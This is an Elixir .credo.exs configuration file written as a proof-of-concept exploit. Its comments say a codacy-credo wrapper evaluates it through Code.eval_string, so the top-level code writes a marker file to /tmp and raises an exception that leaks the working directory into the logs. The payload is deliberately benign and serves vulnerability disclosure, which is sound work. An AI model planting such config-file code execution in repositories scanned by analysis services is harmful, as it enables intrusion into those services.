# PoC payload - benign marker only. RCE via codacy-credo: the wrapper's no-patterns
# branch calls Credo.ConfigFile.read_or_default(..., "/src/") which evaluates this .credo.exs
# via Code.eval_string (Credo ExsLoader.parse, safe=false by default). Top-level Elixir runs.
marker = "/tmp/codacy-credo-rce-confirmed.txt"
File.write!(marker, "RCE confirmed via .credo.exs Code.eval_string. cwd=#{File.cwd!()} marker=#{marker}\n")

# Throw a sentinel assembled from runtime values so execution is observable in the Codacy logs.
raise "CODEX_RCE_CREDO_PROOF_#{File.cwd!()}_marker_written_#{marker}"

%{
  configs: [
    %{
      name: "default",
      checks: []
    }
  ]
}
